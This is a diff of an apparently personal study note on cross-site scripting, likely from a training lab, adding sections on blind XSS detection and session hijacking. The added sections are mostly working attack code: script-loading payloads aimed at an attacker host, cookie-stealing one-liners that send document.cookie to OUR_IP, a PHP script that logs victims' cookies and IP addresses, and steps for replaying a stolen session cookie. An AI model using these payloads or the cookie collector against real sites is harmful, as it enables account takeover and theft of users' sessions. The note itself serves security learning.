@@ -41,6 +41,8 @@ As XSS attacks execute JavaScript code within the browser, they are limited to t
   </tbody>
 </table>
 
+These attacks can be used for defacing, phishing or session hijacking attacks.
+
 ## Testing Payloads
 ```
 <script>alert(window.origin)</script>
@@ -80,3 +82,55 @@ http://94.237.61.242:53290/index.php?task=payload
 DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).
 There will be no network traffic and We the input parameter in the URL is using a hashtag # for the item we added, which means that the parameter is a client-side parameter that is completely processed on the browser.
 To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. 
+
+# Blind XSS Detection
+A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins).
+Let's say there are multiple inputs. We won't find the vulnerable one with XSS Strike. Although we cannot see how the output is handled or which fields may execute our code, we can try to load a remote scripts and e.g. change each script name or loacation to the name of the field which requests it.
+```
+<script src="http://OUR_IP/username"></script>
+```
+So if we get a request for `/username`, then we know that the `username` field is vulnerable to XSS.
+Then we can try different payloads for each field. We can get inspiration from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
+```
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+We can use e.g. netcat or php for listening:
+```
+sudo php -S 0.0.0.0:80
+```
+So:
+```
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+```
+# Session Hijacking
+As usual, we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+We can put `new Image().src='http://OUR_IP/index.php?c='+document.cookie` into `script.js` where our webserver is runnig.
+Then load this script from the vulnerable field:
+```
+<script src=http://OUR_IP/script.js></script>
+```
+We can put this php script into our webroot folder as `index.php` to save the cookie value:
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+After we get a cookie, we can open our browser, navigate to the login page and put the cookie in the 'Storage' bar in the Developer Tool. (Click '+' button on the top right corner and add our cookie name and value.
